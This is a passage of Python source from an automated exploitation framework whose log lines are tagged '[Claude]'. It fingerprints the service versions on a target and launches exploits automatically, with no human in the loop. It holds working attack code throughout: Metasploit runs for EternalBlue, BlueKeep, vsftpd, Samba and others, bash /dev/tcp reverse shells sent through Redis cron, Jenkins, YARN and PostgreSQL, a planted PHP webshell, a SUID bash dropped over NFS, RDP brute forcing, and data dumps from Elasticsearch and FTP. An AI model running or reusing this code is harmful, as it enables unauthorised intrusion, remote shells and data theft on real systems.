                if re.search(r'\$[156]?\$|\$2[aby]\$|[a-fA-F0-9]{32,}:[a-fA-F0-9]{32}', out):
                    self._auto_crack_hashes(out, target, accumulated_output)
                # LFI → RCE chain: if LFI detected, escalate
                lfi_match = re.search(
                    r'LFI_CONFIRMED.*?(?:url|path)?[:\s]+(https?://[^\s]+)\?(\w+)=',
                    out, re.IGNORECASE
                )
                if not lfi_match:
                    # Try finding from tool name (e.g. lfi-scan output)
                    lfi_match2 = re.search(
                        r'(?:VULNERABLE|LFI|path traversal)[^\n]*\n.*?(https?://[^\s?]+)\?([^=\s&]+)=',
                        out, re.IGNORECASE | re.DOTALL
                    )
                    if lfi_match2:
                        lfi_url, lfi_param = lfi_match2.group(1), lfi_match2.group(2)
                        self._lfi_to_rce_chain(target, port_num, lfi_param, lfi_url, accumulated_output)
                elif lfi_match:
                    lfi_url, lfi_param = lfi_match.group(1), lfi_match.group(2)
                    self._lfi_to_rce_chain(target, port_num, lfi_param, lfi_url, accumulated_output)
                if out.strip():
                    accumulated_output.append(f"=== {name} ===\n{out[:900]}")

    def _auto_exploit_by_version(self, target, open_ports, accumulated_output):
        """Fire known exploits immediately based on version fingerprinting — no AI needed."""
        for p in open_ports:
            if not self._running:
                break
            port_num = p["port"]
            svc = p["service"].lower()
            ver = p["version"].lower()

            # ── vsftpd 2.3.4 backdoor ────────────────────────────────────
            if ("ftp" in svc or port_num == 21) and "2.3.4" in ver:
                self._log(f"[Claude] AUTO-EXPLOIT: vsftpd 2.3.4 backdoor!")
                out, _ = self._run_cmd(
                    "vsftpd-backdoor",
                    f"msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; "
                    f"set RHOSTS {target}; set PAYLOAD cmd/unix/interact; "
                    f"run; sleep 12; exit' 2>/dev/null",
                    target, timeout=60,
                )
                self._capture_evidence(out, target, "vsftpd-backdoor",
                                       "msfconsole vsftpd_234_backdoor")
                accumulated_output.append(f"=== vsftpd EXPLOIT ===\n{out[:600]}")

            # ── UnrealIRCd 3.2.8.1 backdoor ─────────────────────────────
            if port_num in (6667, 6697, 6660) and "unrealircd" in ver and "3.2.8" in ver:
                self._log(f"[Claude] AUTO-EXPLOIT: UnrealIRCd 3.2.8.1!")
                out, _ = self._run_cmd(
                    "unrealircd-backdoor",
                    f"msfconsole -q -x 'use exploit/unix/irc/unreal_ircd_3281_backdoor; "
                    f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
                    f"set PAYLOAD cmd/unix/reverse_netcat; run; sleep 15; exit' 2>/dev/null",
                    target, timeout=60,
                )
                self._capture_evidence(out, target, "unrealircd-backdoor", "msfconsole unrealircd")
                accumulated_output.append(f"=== UnrealIRCd EXPLOIT ===\n{out[:600]}")

            # ── Samba < 3.0.20 usermap_script (CVE-2007-2447) ───────────
            if port_num in (139, 445) and "samba" in ver:
                m = re.search(r'samba\s+(\d+)\.(\d+)', ver)
                if m and (int(m.group(1)) < 3 or (int(m.group(1)) == 3 and int(m.group(2)) < 20)):
                    self._log(f"[Claude] AUTO-EXPLOIT: Samba {m.group(0)} usermap_script!")
                    out, _ = self._run_cmd(
                        "samba-usermap",
                        f"msfconsole -q -x 'use exploit/multi/samba/usermap_script; "
                        f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
                        f"set PAYLOAD cmd/unix/reverse_netcat; run; sleep 15; exit' 2>/dev/null",
                        target, timeout=60,
                    )
                    self._capture_evidence(out, target, "samba-usermap", "msfconsole usermap_script")
                    accumulated_output.append(f"=== Samba EXPLOIT ===\n{out[:600]}")

            # ── Distccd RCE (CVE-2004-2687) ──────────────────────────────
            if port_num == 3632 or "distccd" in ver:
                self._log(f"[Claude] AUTO-EXPLOIT: Distccd RCE!")
                out, _ = self._run_cmd(
                    "distccd-rce",
                    f"msfconsole -q -x 'use exploit/unix/misc/distcc_exec; "
                    f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
                    f"set PAYLOAD cmd/unix/reverse_netcat; run; sleep 12; exit' 2>/dev/null",
                    target, timeout=60,
                )
                self._capture_evidence(out, target, "distccd-rce", "msfconsole distcc_exec")
                accumulated_output.append(f"=== Distccd EXPLOIT ===\n{out[:600]}")

            # ── PHP CGI arg injection (CVE-2012-1823) ────────────────────
            if ("http" in svc or port_num in (80, 8080)) and "php" in ver:
                php_m = re.search(r'php[/ ](\d+)\.(\d+)', ver)
                if php_m and int(php_m.group(1)) == 5 and int(php_m.group(2)) < 4:
                    self._log(f"[Claude] AUTO-EXPLOIT: PHP CGI arg injection!")
                    out, _ = self._run_cmd(
                        "php-cgi-rce",
                        f"msfconsole -q -x 'use exploit/multi/http/php_cgi_arg_injection; "
                        f"set RHOSTS {target}; set RPORT {port_num}; "
                        f"set PAYLOAD php/reverse_php; set LHOST {self.lhost}; set LPORT {self.lport}; "
                        f"run; sleep 12; exit' 2>/dev/null",
                        target, timeout=60,
                    )
                    self._capture_evidence(out, target, "php-cgi-rce", "msfconsole php_cgi")
                    accumulated_output.append(f"=== PHP CGI EXPLOIT ===\n{out[:600]}")

            # ── Redis no-auth check + RCE via cron ───────────────────────
            if port_num == 6379 or "redis" in svc:
                out, _ = self._run_cmd(
                    "redis-noauth-check",
                    f"redis-cli -h {target} -p {port_num} ping 2>/dev/null",
                    target, timeout=10,
                )
                if "PONG" in out:
                    self._log(f"[Claude] Redis sin auth → intentando RCE via cron!")
                    rce_out, _ = self._run_cmd(
                        "redis-cron-rce",
                        f"redis-cli -h {target} -p {port_num} config set dir /var/spool/cron 2>/dev/null; "
                        f"redis-cli -h {target} -p {port_num} config set dbfilename root 2>/dev/null; "
                        f"redis-cli -h {target} -p {port_num} set pwn "
                        f"\"\\n\\n* * * * * bash -i >&/dev/tcp/{self.lhost}/{self.lport} 0>&1\\n\\n\" 2>/dev/null; "
                        f"redis-cli -h {target} -p {port_num} save 2>/dev/null && echo 'Redis RCE cron written'; "
                        f"redis-cli -h {target} -p {port_num} config set dir /root/.ssh 2>/dev/null; "
                        f"redis-cli -h {target} -p {port_num} config set dbfilename authorized_keys 2>/dev/null; "
                        f"redis-cli -h {target} -p {port_num} set ssh \"\\n\\n$(cat ~/.ssh/id_rsa.pub 2>/dev/null)\\n\\n\" 2>/dev/null; "
                        f"redis-cli -h {target} -p {port_num} save 2>/dev/null",
                        target, timeout=20,
                    )
                    self._capture_evidence(rce_out, target, "redis-cron-rce", "redis no-auth rce")
                    accumulated_output.append(f"=== Redis RCE ===\n{out[:200]}\n{rce_out[:400]}")

            # ── MySQL empty root ──────────────────────────────────────────
            if port_num == 3306 or "mysql" in svc:
                out, _ = self._run_cmd(
                    "mysql-empty-root",
                    f"mysql -h {target} -u root --password='' -e "
                    f"'show databases; select user,host from mysql.user; "
                    f"SELECT @@secure_file_priv;' 2>/dev/null | head -30",
                    target, timeout=15,
                )
                if "information_schema" in out.lower() or "database" in out.lower():
                    self._log(f"[Claude] MySQL root sin password → intentando webshell!")
                    ws_out, _ = self._run_cmd(
                        "mysql-webshell",
                        f"mysql -h {target} -u root --password='' -e "
                        f"\"SELECT '<?php system(\\$_GET[\\\"cmd\\\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';\" "
                        f"2>/dev/null && echo MYSQL_WEBSHELL_WRITTEN; "
                        f"curl -s --max-time 5 'http://{target}/shell.php?cmd=id' 2>/dev/null | head -3",
                        target, timeout=20,
                    )
                    self._capture_evidence(ws_out, target, "mysql-webshell", "mysql into outfile")
                    accumulated_output.append(f"=== MySQL Empty Root ===\n{out[:400]}\n{ws_out[:400]}")

            # ── ProFTPD 1.3.5 mod_copy RCE ───────────────────────────────
            if (port_num == 21 or "ftp" in svc) and "proftpd" in ver and "1.3.5" in ver:
                self._log(f"[Claude] AUTO-EXPLOIT: ProFTPD 1.3.5 mod_copy!")
                out, _ = self._run_cmd(
                    "proftpd-modcopy",
                    f"msfconsole -q -x 'use exploit/unix/ftp/proftpd_modcopy_exec; "
                    f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
                    f"set PAYLOAD cmd/unix/reverse_netcat; run; sleep 12; exit' 2>/dev/null",
                    target, timeout=60,
                )
                self._capture_evidence(out, target, "proftpd-modcopy", "proftpd_modcopy_exec")
                accumulated_output.append(f"=== ProFTPD EXPLOIT ===\n{out[:600]}")

            # ── rlogin / rexec / rsh (Berkeley R-services) ───────────────
            if port_num in (512, 513, 514) or svc in ("rlogin", "rexec", "shell", "rsh"):
                self._log(f"[Claude] AUTO-EXPLOIT: R-services sin auth (puerto {port_num})!")
                if port_num == 513 or "rlogin" in svc:
                    out, _ = self._run_cmd(
                        "rlogin-noauth",
                        f"rlogin -l root {target} -n 2>/dev/null <<'EOF'\nid\nwhoami\ncat /etc/passwd\ncat /root/root.txt 2>/dev/null\nEOF\n || "
                        f"msfconsole -q -x 'use auxiliary/scanner/rservices/rlogin_login; "
                        f"set RHOSTS {target}; set USERNAME root; set PASSWORD \"\"; run; exit' 2>/dev/null",
                        target, timeout=30,
                    )
                    self._capture_evidence(out, target, "rlogin-noauth", "rlogin -l root")
                    accumulated_output.append(f"=== rlogin ===\n{out[:500]}")
                if port_num == 512 or "rexec" in svc:
                    out, _ = self._run_cmd(
                        "rexec-noauth",
                        f"msfconsole -q -x 'use auxiliary/scanner/rservices/rexec_login; "
                        f"set RHOSTS {target}; set USERNAME root; set PASSWORD \"\"; run; exit' 2>/dev/null",
                        target, timeout=30,
                    )
                    self._capture_evidence(out, target, "rexec-noauth", "rexec auxiliary")
                if port_num == 514 or svc in ("shell", "rsh"):
                    out, _ = self._run_cmd(
                        "rsh-noauth",
                        f"rsh {target} -l root 'id; cat /etc/passwd; cat /root/root.txt 2>/dev/null' 2>/dev/null || "
                        f"msfconsole -q -x 'use auxiliary/scanner/rservices/rsh_login; "
                        f"set RHOSTS {target}; set USERNAME root; set PASSWORD \"\"; run; exit' 2>/dev/null",
                        target, timeout=30,
                    )
                    self._capture_evidence(out, target, "rsh-noauth", "rsh -l root")
                    accumulated_output.append(f"=== rsh ===\n{out[:500]}")

            # ── Webmin backdoor (CVE-2019-15107) ─────────────────────────
            if ("webmin" in ver or "webmin" in svc) and any(v in ver for v in ["1.88", "1.900", "1.91"]):
                self._log(f"[Claude] AUTO-EXPLOIT: Webmin backdoor CVE-2019-15107!")
                out, _ = self._run_cmd(
                    "webmin-backdoor",
                    f"msfconsole -q -x 'use exploit/linux/http/webmin_backdoor; "
                    f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
                    f"set SSL true; set PAYLOAD cmd/unix/reverse_netcat; run; sleep 12; exit' 2>/dev/null",
                    target, timeout=60,
                )
                self._capture_evidence(out, target, "webmin-backdoor", "webmin_backdoor")
                accumulated_output.append(f"=== Webmin EXPLOIT ===\n{out[:600]}")

            # ── NFS no_root_squash → SUID bash ───────────────────────────
            if port_num == 2049 or "nfs" in svc or "mountd" in svc:
                out, _ = self._run_cmd(
                    "nfs-enum",
                    f"showmount -e {target} 2>/dev/null",
                    target, timeout=15,
                )
                accumulated_output.append(f"=== NFS Exports ===\n{out[:400]}")
                if out.strip():
                    # Parse exported paths
                    exports = re.findall(r'(/[^\s]+)', out)
                    for export_path in exports[:3]:
                        self._log(f"[Claude] NFS export {export_path} → montando para no_root_squash check")
                        rce_out, _ = self._run_cmd(
                            f"nfs-mount-{export_path.replace('/','_')}",
                            f"MNTDIR=$(mktemp -d); "
                            f"mount -t nfs -o nolock {target}:{export_path} $MNTDIR 2>/dev/null && echo 'NFS_MOUNTED_OK' && "
                            f"ls -la $MNTDIR 2>/dev/null | head -20; "
                            f"cat $MNTDIR/root/root.txt 2>/dev/null; "
                            f"cat $MNTDIR/home/*/user.txt 2>/dev/null | head -5; "
                            f"# Check no_root_squash: if we can write as root, this is critical\n"
                            f"cp /bin/bash $MNTDIR/bash_suid 2>/dev/null && chmod +s $MNTDIR/bash_suid 2>/dev/null && "
                            f"echo 'NFS_NO_ROOT_SQUASH_CONFIRMED' || echo 'root_squash_active'; "
                            f"umount $MNTDIR 2>/dev/null; rmdir $MNTDIR 2>/dev/null",
                            target, timeout=30,
                        )
                        self._capture_evidence(rce_out, target, "nfs-no_root_squash", f"nfs mount {export_path}")
                        accumulated_output.append(f"=== NFS Mount {export_path} ===\n{rce_out[:600]}")

            # ── Elasticsearch no-auth data dump ──────────────────────────
            if port_num == 9200 or "elasticsearch" in svc or "elastic" in svc:
                out, _ = self._run_cmd(
                    "elastic-noauth",
                    f"curl -s --max-time 10 'http://{target}:{port_num}/_cat/indices?v' 2>/dev/null | head -20; "
                    f"curl -s --max-time 10 'http://{target}:{port_num}/_cluster/health?pretty' 2>/dev/null | head -10; "
                    f"curl -s --max-time 10 'http://{target}:{port_num}/_nodes?pretty' 2>/dev/null | grep -E 'name|version|ip' | head -10",
                    target, timeout=20,
                )
                if "indices" in out.lower() or "cluster" in out.lower() or "green" in out or "yellow" in out:
                    self._log(f"[Claude] Elasticsearch sin auth → volcando datos!")
                    dump_out, _ = self._run_cmd(
                        "elastic-dump",
                        f"# Dump first 5 records from each index\n"
                        f"INDICES=$(curl -s --max-time 10 'http://{target}:{port_num}/_cat/indices' 2>/dev/null | awk '{{print $3}}' | head -5); "
                        f"for idx in $INDICES; do "
                        f"echo \"=== Index: $idx ===\"; "
                        f"curl -s --max-time 10 'http://{target}:{port_num}/'$idx'/_search?size=5&pretty' 2>/dev/null | "
                        f"python3 -c 'import json,sys; d=json.load(sys.stdin); "
                        f"[print(json.dumps(h[\"_source\"],indent=2)[:500]) for h in d.get(\"hits\",{{}}).get(\"hits\",[])[:3]]' 2>/dev/null | head -30; "
                        f"done",
                        target, timeout=30,
                    )
                    accumulated_output.append(f"=== Elasticsearch ===\n{out[:400]}\n{dump_out[:800]}")
                    # Save as finding
                    if out.strip():
                        self._save_findings([{
                            "title": f"Elasticsearch Sin Autenticación @ {target}:{port_num}",
                            "severity": "critical", "description":
                            f"Elasticsearch accesible sin auth. Índices expuestos:\n{out[:300]}",
                            "cve": "CVE-2014-3120",
                        }], target)

            # ── CouchDB Admin Party ───────────────────────────────────────
            if port_num == 5984 or "couchdb" in svc:
                out, _ = self._run_cmd(
                    "couchdb-noauth",
                    f"curl -s --max-time 10 'http://{target}:{port_num}/' 2>/dev/null; "
                    f"curl -s --max-time 10 'http://{target}:{port_num}/_all_dbs' 2>/dev/null; "
                    f"curl -s --max-time 10 'http://{target}:{port_num}/_users/_all_docs' 2>/dev/null | head -20",
                    target, timeout=20,
                )
                if "couchdb" in out.lower() or "_all_dbs" in out or "[" in out:
                    self._log(f"[Claude] CouchDB sin auth → intentando RCE!")
                    rce_out, _ = self._run_cmd(
                        "couchdb-rce",
                        f"msfconsole -q -x 'use exploit/linux/http/apache_couchdb_rce; "
                        f"set RHOSTS {target}; set RPORT {port_num}; "
                        f"set LHOST {self.lhost}; set LPORT {self.lport}; "
                        f"set PAYLOAD linux/x64/shell_reverse_tcp; run; sleep 12; exit' 2>/dev/null",
                        target, timeout=60,
                    )
                    self._capture_evidence(rce_out, target, "couchdb-rce", "couchdb_rce")
                    accumulated_output.append(f"=== CouchDB ===\n{out[:400]}\n{rce_out[:400]}")

            # ── Hadoop YARN RCE ───────────────────────────────────────────
            if port_num in (8088, 8090) or "hadoop" in svc or "yarn" in svc:
                out, _ = self._run_cmd(
                    "hadoop-yarn-rce",
                    f"curl -s --max-time 10 'http://{target}:{port_num}/ws/v1/cluster/info' 2>/dev/null | head -5; "
                    f"# Hadoop YARN RCE via application submission\n"
                    f"curl -s --max-time 15 -X POST 'http://{target}:{port_num}/ws/v1/cluster/apps/new-application' 2>/dev/null | head -5",
                    target, timeout=30,
                )
                if "hadoopVersion" in out or "resourceManager" in out or "application" in out.lower():
                    self._log(f"[Claude] Hadoop YARN sin auth → RCE via job submission!")
                    _yarn_lhost = self.lhost
                    _yarn_lport = self.lport
                    _yarn_base = f"http://{target}:{port_num}/ws/v1/cluster"
                    _yarn_cmd = f"bash -i >&/dev/tcp/{_yarn_lhost}/{_yarn_lport} 0>&1"
                    _yarn_script = (
                        "import urllib.request, json\n"
                        f"base='{_yarn_base}'\n"
                        "app_id=json.loads(urllib.request.urlopen(base+'/apps/new-application',b'',timeout=10).read())['application-id']\n"
                        f"cmd='/bin/bash -c \"{_yarn_cmd}\"'\n"
                        "payload=json.dumps({'application-id':app_id,'application-name':'pwn','application-type':'YARN',"
                        "'am-container-spec':{'commands':{'command':cmd}},"
                        "'resource':{'memory':512,'vCores':1},'priority':{'priority':1},'unmanaged-AM':False}).encode()\n"
                        "req=urllib.request.Request(base+'/apps',payload,{'Content-Type':'application/json'})\n"
                        "print(urllib.request.urlopen(req,timeout=15).read()[:200])\n"
                    )
                    rce_out, _ = self._run_cmd(
                        "hadoop-yarn-job-rce",
                        f"python3 -c {__import__('shlex').quote(_yarn_script)} 2>/dev/null",
                        target, timeout=30,
                    )
                    self._capture_evidence(rce_out, target, "hadoop-yarn-rce", "yarn job submission")
                    accumulated_output.append(f"=== Hadoop YARN ===\n{rce_out[:600]}")

            # ── Jenkins no-auth Groovy RCE ────────────────────────────────
            if port_num in (8080, 8443, 8888) or "jenkins" in ver:
                out, _ = self._run_cmd(
                    "jenkins-detect",
                    f"curl -s -I --max-time 8 'http://{target}:{port_num}/' 2>/dev/null | grep -i 'x-jenkins\\|jenkins'; "
                    f"curl -s -o /dev/null -w '%{{http_code}}' --max-time 8 'http://{target}:{port_num}/script' 2>/dev/null",
                    target, timeout=15,
                )
                if "x-jenkins" in out.lower() or "200" in out:
                    if "200" in out:  # /script accessible without auth
                        self._log(f"[Claude] Jenkins /script accesible sin auth → RCE!")
                        rce_out, _ = self._run_cmd(
                            "jenkins-groovy-rce",
                            f"curl -s --max-time 15 -X POST 'http://{target}:{port_num}/scriptText' "
                            f"--data 'script=println(\"id\".execute().text+\"\\n\"+\"hostname\".execute().text+\"\\n\"+\"cat /etc/passwd\".execute().text)' "
                            f"2>/dev/null | head -10; "
                            f"curl -s --max-time 15 -X POST 'http://{target}:{port_num}/scriptText' "
                            f"--data 'script=[\"bash\",\"-c\",\"bash -i >&/dev/tcp/{self.lhost}/{self.lport} 0>&1\"].execute()' "
                            f"2>/dev/null | head -5",
                            target, timeout=30,
                        )
                        self._capture_evidence(rce_out, target, "jenkins-groovy-rce", "jenkins scriptText")
                        accumulated_output.append(f"=== Jenkins RCE ===\n{out[:200]}\n{rce_out[:600]}")

            # ── Shellshock via HTTP CGI ───────────────────────────────────
            if "http" in svc or port_num in (80, 443, 8080, 8443):
                out, _ = self._run_cmd(
                    f"shellshock-cgi-{port_num}",
                    f"for cgi in /cgi-bin/test.cgi /cgi-bin/admin.cgi /cgi-bin/login.cgi /cgi-bin/status /cgi-bin/printenv; do "
                    f"R=$(curl -s --max-time 8 -A '() {{ :; }}; echo; echo SHELLSHOCK_RCE; id' "
                    f"'http://{target}:{port_num}$cgi' 2>/dev/null | grep 'SHELLSHOCK_RCE\\|uid='); "
                    f"[ -n \"$R\" ] && echo \"SHELLSHOCK_RCE: $cgi — $R\" && break; done",
                    target, timeout=40,
                )
                self._capture_evidence(out, target, f"shellshock-{port_num}", "shellshock cgi")
                if "SHELLSHOCK_RCE" in out:
                    accumulated_output.append(f"=== Shellshock ===\n{out[:500]}")

            # ── VNC no-auth ───────────────────────────────────────────────
            if port_num in (5900, 5901, 5902) or "vnc" in svc:
                out, _ = self._run_cmd(
                    "vnc-noauth",
                    f"nmap -p {port_num} --script vnc-info {target} 2>/dev/null | grep -i 'Authentication\\|None\\|security type'",
                    target, timeout=20,
                )
                if "none" in out.lower() or "no authentication" in out.lower():
                    self._log(f"[Claude] VNC sin auth en {target}:{port_num}!")
                    self._save_findings([{
                        "title": f"VNC Sin Autenticación @ {target}:{port_num}",
                        "severity": "critical",
                        "description": "VNC accesible sin contraseña — acceso total al escritorio",
                        "cve": "",
                    }], target)
                accumulated_output.append(f"=== VNC ===\n{out[:300]}")

            # ── X11 expuesto ──────────────────────────────────────────────
            if port_num == 6000 or "x11" in svc:
                out, _ = self._run_cmd(
                    "x11-open",
                    f"timeout 5 xdpyinfo -display {target}:0 2>/dev/null | head -10 && echo X11_OPEN || true",
                    target, timeout=10,
                )
                if "X11_OPEN" in out or "screen" in out.lower():
                    self._log(f"[Claude] X11 abierto en {target} → capturando pantalla!")
                    self._save_findings([{
                        "title": f"X11 Display Expuesto @ {target}:6000",
                        "severity": "critical",
                        "description": "X11 accesible sin control de acceso — xwd permite captura de pantalla",
                        "cve": "",
                    }], target)

            # ── IPMI hash dump ────────────────────────────────────────────
            if port_num == 623 or "ipmi" in svc:
                out, _ = self._run_cmd(
                    "ipmi-hashump",
                    f"msfconsole -q -x 'use auxiliary/scanner/ipmi/ipmi_dumphashes; "
                    f"set RHOSTS {target}; run; exit' 2>/dev/null | grep -E 'IPMI|hash|admin|password' | head -10",
                    target, timeout=40,
                )
                accumulated_output.append(f"=== IPMI ===\n{out[:400]}")
                if out.strip():
                    self._capture_evidence(out, target, "ipmi-dumphashes", "ipmi_dumphashes")

            # ── Anonymous FTP → grab everything useful ───────────────────
            if port_num == 21 or "ftp" in svc:
                out, _ = self._run_cmd(
                    "ftp-anon-grab",
                    f"timeout 20 ftp -n {target} <<'FTPEOF'\nuser anonymous anonymous\nls -laR\nget user.txt /tmp/ftp_user_{target.replace('.','_')}.txt\nget flag.txt /tmp/ftp_flag_{target.replace('.','_')}.txt\nget id_rsa /tmp/ftp_idrsa_{target.replace('.','_')}\nquit\nFTPEOF\n2>/dev/null; "
                    f"cat /tmp/ftp_user_{target.replace('.','_')}.txt 2>/dev/null; "
                    f"cat /tmp/ftp_flag_{target.replace('.','_')}.txt 2>/dev/null; "
                    f"cat /tmp/ftp_idrsa_{target.replace('.','_')} 2>/dev/null | head -5",
                    target, timeout=25,
                )
                self._capture_evidence(out, target, "ftp-anon-grab", "ftp anonymous")
                if out.strip():
                    accumulated_output.append(f"=== FTP Anonymous ===\n{out[:600]}")

            # ── EternalBlue MS17-010 + MS08-067 (Windows SMB) ────────────
            if port_num in (139, 445) and "samba" not in ver:
                # Check for MS17-010
                ms17_out, _ = self._run_cmd(
                    "ms17010-check",
                    f"nmap -p 445 --script smb-vuln-ms17-010 {target} 2>/dev/null | "
                    f"grep -iE 'VULNERABLE|MS17-010|EternalBlue|CVE-2017'",
                    target, timeout=30,
                )
                if "VULNERABLE" in ms17_out or "ms17-010" in ms17_out.lower():
                    self._log(f"[Claude] AUTO-EXPLOIT: MS17-010 EternalBlue detectado!")
                    eb_out, _ = self._run_cmd(
                        "eternalblue-exploit",
                        f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; "
                        f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
                        f"set payload windows/x64/shell/reverse_tcp; "
                        f"set ExitOnSession false; run -j; sleep 20; "
                        f"sessions -l; sessions -i 1 -c \"whoami && hostname && ipconfig && type C:\\\\Users\\\\Administrator\\\\Desktop\\\\root.txt\"; "
                        f"exit' 2>/dev/null",
                        target, timeout=90,
                    )
                    self._capture_evidence(eb_out, target, "eternalblue-exploit", "MS17-010 EternalBlue")
                    accumulated_output.append(f"=== EternalBlue MS17-010 ===\n{eb_out[:800]}")
                    if any(k in eb_out.lower() for k in ["shell session", "meterpreter session", "nt authority"]):
                        # Post-exploit Windows via session
                        self._windows_post_exploit(target, None, None, eb_out, accumulated_output)
                else:
                    # Check MS08-067
                    ms08_out, _ = self._run_cmd(
                        "ms08067-check",
                        f"nmap -p 445 --script smb-vuln-ms08-067 {target} 2>/dev/null | "
                        f"grep -iE 'VULNERABLE|MS08-067|CVE-2008'",
                        target, timeout=30,
                    )
                    if "VULNERABLE" in ms08_out:
                        self._log(f"[Claude] AUTO-EXPLOIT: MS08-067!")
                        out, _ = self._run_cmd(
                            "ms08067-exploit",
                            f"msfconsole -q -x 'use exploit/windows/smb/ms08_067_netapi; "
                            f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
                            f"set payload windows/shell/reverse_tcp; run; sleep 15; exit' 2>/dev/null",
                            target, timeout=90,
                        )
                        self._capture_evidence(out, target, "ms08067-exploit", "MS08-067")
                        accumulated_output.append(f"=== MS08-067 ===\n{out[:600]}")

            # ── BlueKeep CVE-2019-0708 (RDP) ─────────────────────────────
            if port_num == 3389 or "rdp" in svc or "ms-wbt-server" in svc:
                self._log(f"[Claude] AUTO-EXPLOIT: comprobando BlueKeep CVE-2019-0708")
                bk_check, _ = self._run_cmd(
                    "bluekeep-check",
                    f"nmap -p 3389 --script rdp-vuln-ms12-020,rdp-enum-encryption {target} 2>/dev/null | head -20; "
                    f"msfconsole -q -x 'use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; "
                    f"set RHOSTS {target}; run; exit' 2>/dev/null | grep -iE 'vulnerable|bluekeep|CVE-2019' | head -5",
                    target, timeout=40,
                )
                if "vulnerable" in bk_check.lower() or "CVE-2019-0708" in bk_check:
                    self._log(f"[Claude] AUTO-EXPLOIT: BlueKeep confirmado → explotando!")
                    bk_out, _ = self._run_cmd(
                        "bluekeep-exploit",
                        f"msfconsole -q -x 'use exploit/windows/rdp/cve_2019_0708_bluekeep_rce; "
                        f"set RHOSTS {target}; set LHOST {self.lhost}; set LPORT {self.lport}; "
                        f"set TARGET 5; set payload windows/x64/meterpreter/reverse_tcp; "
                        f"run; sleep 20; sessions -l; exit' 2>/dev/null | head -30",
                        target, timeout=90,
                    )
                    self._capture_evidence(bk_out, target, "bluekeep-exploit", "CVE-2019-0708 BlueKeep")
                    accumulated_output.append(f"=== BlueKeep RDP RCE ===\n{bk_out[:600]}")
                    self._save_findings([{
                        "title": f"BlueKeep CVE-2019-0708 RDP RCE @ {target}:{port_num}",
                        "severity": "critical",
                        "description": f"RDP vulnerable a BlueKeep → RCE sin autenticación.\n{bk_check[:200]}",
                        "cve": "CVE-2019-0708",
                    }], target)
                    if any(k in bk_out.lower() for k in ["session", "meterpreter"]):
                        self._windows_post_exploit(target, None, None, bk_out, accumulated_output)
                # RDP brute force (always try)
                rdp_bf, _ = self._run_cmd(
                    "rdp-bruteforce",
                    f"hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt "
                    f"-P /usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt "
                    f"-t 4 -f rdp://{target}:{port_num} 2>/dev/null | grep -E '\\[rdp\\].*login:' | head -5; "
                    f"# Try most common Windows creds\n"
                    f"for u in administrator admin guest; do "
                    f"  for p in '' password Password1 admin 123456; do "
                    f"    xfreerdp /v:{target}:{port_num} /u:$u /p:$p /cert-ignore +auth-only 2>/dev/null | "
                    f"    grep -i 'success\\|Authentication' && echo \"RDP_CRED_VALID: $u:$p\"; "
                    f"  done; "
                    f"done 2>/dev/null | grep 'RDP_CRED_VALID' | head -3",
                    target, timeout=60,
                )
                rdp_creds = re.findall(r'RDP_CRED_VALID: (\w+):(\S*)', rdp_bf)
                for ru, rp in rdp_creds[:2]:
                    self._windows_post_exploit(target, ru, rp, rdp_bf, accumulated_output)
                if rdp_bf.strip():
                    accumulated_output.append(f"=== RDP {target}:{port_num} ===\n{rdp_bf[:400]}")

            # ── PostgreSQL empty/default creds → RCE via COPY TO PROGRAM ──
            if port_num == 5432 or "postgresql" in svc or "postgres" in svc:
                self._log(f"[Claude] AUTO-EXPLOIT: PostgreSQL en {target}:{port_num}")
                pg_out, _ = self._run_cmd(
                    "pg-empty-creds",
                    f"# Try postgres/postgres, postgres/'', then other defaults\n"
                    f"for cred in 'postgres:' 'postgres:postgres' 'postgres:password' 'admin:admin'; do "
                    f"  U=$(echo $cred | cut -d: -f1); P=$(echo $cred | cut -d: -f2); "
                    f"  PGPASSWORD=$P psql -h {target} -p {port_num} -U $U -c "
                    f"  'SELECT version(); SELECT current_user; SELECT pg_ls_dir(\\'/etc\\');' 2>/dev/null | head -10 && "
                    f"  echo \"PG_ACCESS: $cred\" && break; "
                    f"done",
                    target, timeout=20,
                )
                if "PG_ACCESS" in pg_out or "postgresql" in pg_out.lower():
                    cred_m = re.search(r'PG_ACCESS: (\S+):(\S*)', pg_out)
                    pg_user = cred_m.group(1) if cred_m else "postgres"
                    pg_pass = cred_m.group(2) if cred_m else ""
                    self._log(f"[Claude] PostgreSQL accesible → intentando RCE via COPY TO PROGRAM!")
                    pg_rce, _ = self._run_cmd(
                        "pg-copy-rce",
                        f"PGPASSWORD='{pg_pass}' psql -h {target} -p {port_num} -U {pg_user} 2>/dev/null <<'PGEOF'\n"
                        f"CREATE TABLE cmd_output(data text);\n"
                        f"COPY cmd_output FROM PROGRAM 'id; whoami; hostname; cat /etc/passwd | head -5';\n"
                        f"SELECT data FROM cmd_output;\n"
                        f"COPY cmd_output FROM PROGRAM 'bash -c \"bash -i >&/dev/tcp/{self.lhost}/{self.lport} 0>&1\" &';\n"
                        f"PGEOF\n",
                        target, timeout=25,
                    )
                    self._capture_evidence(pg_rce, target, "pg-copy-rce", "PostgreSQL COPY TO PROGRAM RCE")
                    accumulated_output.append(f"=== PostgreSQL RCE ===\n{pg_out[:300]}\n{pg_rce[:400]}")
                    self._save_findings([{
                        "title": f"PostgreSQL Sin Auth + RCE via COPY TO PROGRAM @ {target}:{port_num}",
                        "severity": "critical",
                        "description": f"PostgreSQL accesible como {pg_user} → RCE via COPY FROM PROGRAM.\n{pg_rce[:200]}",
                        "cve": "",
                    }], target)

            # ── MongoDB no-auth data dump ──────────────────────────────────
            if port_num == 27017 or "mongodb" in svc or "mongo" in svc:
                self._log(f"[Claude] AUTO-EXPLOIT: MongoDB en {target}:{port_num}")
                mongo_out, _ = self._run_cmd(
                    "mongo-noauth",
